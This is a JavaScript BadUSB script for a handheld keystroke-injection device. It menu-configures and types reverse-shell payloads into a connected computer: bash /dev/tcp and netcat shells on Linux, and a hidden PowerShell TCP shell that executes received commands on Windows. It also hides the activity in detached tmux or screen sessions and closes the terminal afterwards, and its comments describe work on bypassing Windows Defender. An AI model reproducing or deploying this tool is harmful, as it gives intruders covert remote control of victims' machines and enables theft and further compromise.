// ------------------------------------------------------------------------------------------------------------
// UPDATE:
//          With the latest firmware update, the JS api has drastically changed.
//          The following script is easier to use and more user friendly, but still needs some work.
//          But i'm working on it ;)
// This script will generate a reverse shell for you, asking for the IP and Port to connect to as well as
// the type of shell you want to generate and if you need to open a terminal window before sending the payload.
// Please note that on windows 11, the defender will actively block the payload, windows 10 however will not on
// the default settings.
// OS Supported: Linux, Windows
//
// At this stage I'm figuring out a way to bypass the Windows Defender and send a powershell payload.   
//
// By B3rt1ng, https://github.com/b3rt1ng
// ------------------------------------------------------------------------------------------------------------

let eventLoop = require("event_loop");
let gui = require("gui");
let submenuView = require("gui/submenu");
let loadingView = require("gui/loading");
let textInputView = require("gui/text_input");
let badusb = require("badusb");
let notify = require("notification");

let layouts = ["en-US","en-UK","fr-FR","fr-FR-mac","de-DE-mac","de-DE","ba-BA","cz_CS","da-DA","de-CH","dvorak","es-ES","es-LA","fi-FI","fr-BE","fr-CA","fr-CH","hr-HR","hu-HU","it-IT-mac","it-IT","nb-NO","nl-NL","pt-BR","pt-PT","si-SI","sk-SK","sv-SE","tr-TR"];
let ip = "192.168.1.1";
let port = "4242";
let os = "Linux";
let shellType = "bash";
let hideActions = "Tmux";
let openTerminal = "Yes";
let layout = layouts[0];
let disableDefender = false;

badusb.setup({vid: 0xAAAA,pid: 0xBBBB,mfrName: "Normal",prodName: "Device",layoutPath: "/ext/badusb/assets/layouts/" + layout + ".kl"});

let views = {
    operatingSystem: submenuView.makeWith({
        header: "Select an OS",
        items: ["Linux","Mac","Windows"],
    }),

    shellType: submenuView.makeWith({
        header: "Select a shell type",
        items: ["bash","shell","netcat","/bin/sh","/bin/bash","powershell", "cmd", "cmd (admin)"],
    }),

    disableDefender: submenuView.makeWith({
        header: "Disable Windows Defender",
        items: ["Yes","No"],
    }),

    openTerminal: submenuView.makeWith({
        header: "Open terminal",
        items: ["Yes","No"],
    }),

    changeLayout: submenuView.makeWith({
        header: "Change keyboard layout",
        items: layouts,
    }),

    hideActions: submenuView.makeWith({
        header: "Hide actions",
        items: ["Tmux","Screen","No",],
    }),

    ipKeyboard: textInputView.makeWith({
        header: "Set IP address",
        defaultText: ip,
    }),

    portKeyboard: textInputView.makeWith({
        header: "Set port",
        defaultText: port,
    }),

    overView: submenuView.makeWith({
        header: "BadUSB demo",
        items: [
            "IP: " + ip,
            "Port: " + port,
            "OS: " + os,
            "Layout: " + layout,
            "Shell: " + shellType,
            "Hide: " + hideActions,
            "Open terminal: " + openTerminal,
            "Send payload",
        ],
    }),

    loading: loadingView.make(),
};

function updateOverview(views) {
    views.overView.set("items", [
        "IP: " + ip,
        "Port: " + port,
        "OS: " + os,
        "Layout: " + layout,
        "Shell: " + shellType,
        "Hide: " + hideActions,
        "Open terminal: " + openTerminal,
        "Send payload",
    ]);
    views.overView.set("header", "BadUSB demo");
    gui.viewDispatcher.switchTo(views.overView);
}

eventLoop.subscribe(views.overView.chosen, function (_sub, index, gui, eventLoop, views) {
    if (index === 0) {
        gui.viewDispatcher.switchTo(views.ipKeyboard);
    } else if (index === 1) {
        gui.viewDispatcher.switchTo(views.portKeyboard);
    } else if (index === 2) {
        gui.viewDispatcher.switchTo(views.operatingSystem);
    } else if (index === 3) {
        gui.viewDispatcher.switchTo(views.changeLayout);
    } else if (index === 4) {
        gui.viewDispatcher.switchTo(views.shellType);
    } else if (index === 5) {
        gui.viewDispatcher.switchTo(views.hideActions);
    } else if (index === 6) {
        gui.viewDispatcher.switchTo(views.openTerminal);
    } else if (index === 7) {
        gui.viewDispatcher.switchTo(views.loading);
        startBadusb();
        eventLoop.subscribe(eventLoop.timer("oneshot", 100), function (_sub, _, gui, views) {
            gui.viewDispatcher.switchTo(views.overView);
        }, gui, views);
    } 
// ———————————No Switches?———————————
// ⠀⣞⢽⢪⢣⢣⢣⢫⡺⡵⣝⡮⣗⢷⢽⢽⢽⣮⡷⡽⣜⣜⢮⢺⣜⢷⢽⢝⡽⣝
// ⠸⡸⠜⠕⠕⠁⢁⢇⢏⢽⢺⣪⡳⡝⣎⣏⢯⢞⡿⣟⣷⣳⢯⡷⣽⢽⢯⣳⣫⠇
// ⠀⠀⢀⢀⢄⢬⢪⡪⡎⣆⡈⠚⠜⠕⠇⠗⠝⢕⢯⢫⣞⣯⣿⣻⡽⣏⢗⣗⠏⠀
// ⠀⠪⡪⡪⣪⢪⢺⢸⢢⢓⢆⢤⢀⠀⠀⠀⠀⠈⢊⢞⡾⣿⡯⣏⢮⠷⠁⠀⠀
// ⠀⠀⠀⠈⠊⠆⡃⠕⢕⢇⢇⢇⢇⢇⢏⢎⢎⢆⢄⠀⢑⣽⣿⢝⠲⠉⠀⠀⠀⠀
// ⠀⠀⠀⠀⠀⡿⠂⠠⠀⡇⢇⠕⢈⣀⠀⠁⠡⠣⡣⡫⣂⣿⠯⢪⠰⠂⠀⠀⠀⠀
// ⠀⠀⠀⠀⡦⡙⡂⢀⢤⢣⠣⡈⣾⡃⠠⠄⠀⡄⢱⣌⣶⢏⢊⠂⠀⠀⠀⠀⠀⠀
// ⠀⠀⠀⠀⢝⡲⣜⡮⡏⢎⢌⢂⠙⠢⠐⢀⢘⢵⣽⣿⡿⠁⠁⠀⠀⠀⠀⠀⠀⠀
// ⠀⠀⠀⠀⠨⣺⡺⡕⡕⡱⡑⡆⡕⡅⡕⡜⡼⢽⡻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
// ⠀⠀⠀⠀⣼⣳⣫⣾⣵⣗⡵⡱⡡⢣⢑⢕⢜⢕⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
// ⠀⠀⠀⣴⣿⣾⣿⣿⣿⡿⡽⡑⢌⠪⡢⡣⣣⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
// ⠀⠀⠀⡟⡾⣿⢿⢿⢵⣽⣾⣼⣘⢸⢸⣞⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
// ⠀⠀⠀⠀⠁⠇⠡⠩⡫⢿⣝⡻⡮⣒⢽⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
// —————————————————————————————
}, gui, eventLoop, views);

eventLoop.subscribe(gui.viewDispatcher.navigation, function (_sub, _, gui, views, eventLoop) {
    if (gui.viewDispatcher.currentView === views.overView) {
        eventLoop.stop();
        return;
    }
    gui.viewDispatcher.switchTo(views.overView);
}, gui, views, eventLoop);

eventLoop.subscribe(views.ipKeyboard.input, function (_sub, name, gui, views) {
    ip = name;
    updateOverview(views);
    gui.viewDispatcher.switchTo(views.overView);
}, gui, views);

eventLoop.subscribe(views.portKeyboard.input, function (_sub, name, gui, views) {
    port = name;
    updateOverview(views);
}, gui, views);

eventLoop.subscribe(views.operatingSystem.chosen, function (_sub, index, gui, eventLoop, views) {
    if (index === 0) {
        os = "Linux";
        shellType = "bash";
    } else if (index === 1) {
        os = "Mac (not supported yet)";
    } else if (index === 2) {
        os = "Windows";
        shellType = "powershell";
        hideActions = "No";
    }
    updateOverview(views);
}, gui, eventLoop, views);

eventLoop.subscribe(views.changeLayout.chosen, function (_sub, index, gui, eventLoop, views) {
    layout = layouts[index];
    gui.viewDispatcher.switchTo(views.loading);
    badusb.quit();
    badusb.setup({vid: 0xAAAA,pid: 0xBBBB,mfrName: "Normal",prodName: "Device",layoutPath: "/ext/badusb/assets/layouts/" + layout + ".kl"});
    gui.viewDispatcher.switchTo(views.overView);
    updateOverview(views);
}, gui, eventLoop, views);

eventLoop.subscribe(views.shellType.chosen, function (_sub, index, gui, eventLoop, views) {
    if (index === 0) {
        shellType = "bash";
    } else if (index === 1) {
        shellType = "shell";
    } else if (index === 2) {
        shellType = "netcat";
    } else if (index === 3) {
        shellType = "/bin/sh";
    } else if (index === 4) {
        shellType = "/bin/bash";
    } else if (index === 5) {
        shellType = "powershell";
    } else if (index === 6) {
        shellType = "cmd";
    } else if (index === 7) {
        shellType = "cmd (admin)";
    }
    updateOverview(views);
}, gui, eventLoop, views);

eventLoop.subscribe(views.hideActions.chosen, function (_sub, index, gui, eventLoop, views) {
    if (index === 0) {
        hideActions = "Tmux";
    } else if (index === 1) {
        hideActions = "Screen";
    } else if (index === 2) {
        hideActions = "No";
    }
    updateOverview(views);
}, gui, eventLoop, views);

eventLoop.subscribe(views.openTerminal.chosen, function (_sub, index, gui, eventLoop, views) {
    if (index === 0) {
        openTerminal = "Yes";
    } else if (index === 1) {
        openTerminal = "No";
    }
    updateOverview(views);
}, gui, eventLoop, views);

// start the badusb attack
function startBadusb() {
    if (badusb.isConnected()) {
        notify.success();
        if (os === "Linux") {
            if (openTerminal === "Yes") {
                badusb.press("CTRL", "ALT", "t");
                delay(1000);
            }
            let command = "";
            if (shellType === "bash") {
                command = "bash -c 'bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'";
            } else if (shellType === "shell") {
                command = "bash -c 'sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'";
            } else if (shellType === "netcat") {
                command = "nc -e /bin/bash " + ip + " " + port;
            } else if (shellType === "/bin/sh") {
                command = "bash -c '/bin/sh -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'";
            } else if (shellType === "/bin/bash") {
                command = "bash -c '/bin/bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1'";
            }
            if (hideActions === "Tmux") {
                badusb.println("tmux new-session -d -s \"none\" \"" + command + "\"");
                delay(500);
                badusb.press("ALT", "F4");
            } else if (hideActions === "Screen") {
                badusb.println("screen -dmS \"none\" " + command);
                delay(500);
                badusb.press("ALT", "F4");
            } else {
                badusb.println(command);
            }
        } else if (os === "Windows") {
            if (disableDefender) {
                defender_bypass();
            }
            if (shellType === "powershell") {
                if (openTerminal === "Yes") {
                    badusb.press("GUI", "x");
                    delay(500);
                    badusb.press("i");
                    delay(1000);
                }
                badusb.println("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('" + ip + "', " + port + ");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"");
            } else if (shellType === "cmd" || shellType === "cmd (admin)") {
                if (openTerminal === "Yes") {
                    badusb.press("GUI", "r");
                    delay(500);
                    badusb.print("cmd");
                    if (shellType === "cmd (admin)") {
                        badusb.press("CTRL", "SHIFT", "ENTER");
                        delay(500);
                        badusb.press("LEFT");
                        delay(100);
                    }
                    badusb.press("ENTER");
                    delay(700);
                }
                badusb.println("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('" + ip + "', " + port + ");$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'flipper> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"")
            }
        } else if (os === "Mac") {
            notify.error("Mac is not supported yet");
        }
    } else {
        notify.error();
    }
}

gui.viewDispatcher.switchTo(views.overView);
eventLoop.run();
